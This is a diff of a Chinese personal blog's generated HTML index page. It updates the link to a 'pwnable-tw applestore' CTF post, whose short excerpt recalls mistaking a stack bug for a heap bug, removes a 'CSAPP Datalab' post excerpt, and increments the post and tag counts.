           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/01/24/ck79ta45o000p16u5b1pxa2m2/" itemprop="url">pwnable-tw applestore</a></h1>
+                <a class="post-title-link" href="/year/01/24/ck7d9dfxn00378eu51qusewxf/" itemprop="url">pwnable-tw applestore</a></h1>
         
 
         <div class="post-meta">
@@ -1604,158 +1772,7 @@
           <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这道题我一开始一直以为是堆，然后也一直没找到堆溢出的漏洞，最后看了题解才知道原来是个栈，利用方式以前其实也做过，还是不能思维定式了。</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/01/24/ck79ta45o000p16u5b1pxa2m2/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-      <div>
-        
-      </div>
-
-    
-
-    
-
-    
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/22/ck79ta45q000w16u52vxdhxa5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Wood">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="木头的小木屋">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/year/01/22/ck79ta45q000w16u52vxdhxa5/" itemprop="url">CSAPP Datalab</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-22T18:54:07+08:00">
-                2020-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CSAPP/" itemprop="url" rel="index">
-                    <span itemprop="name">CSAPP</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>CSAPP大概都过了一遍，但是很多东西不实践一下理解还是不到位，趁这个假期尽量把11个lab做一下。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/year/01/22/ck79ta45q000w16u52vxdhxa5/#more" rel="contents">
+            <a class="btn" href="/year/01/24/ck7d9dfxn00378eu51qusewxf/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1852,7 +1869,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-count">40</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1874,7 +1891,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
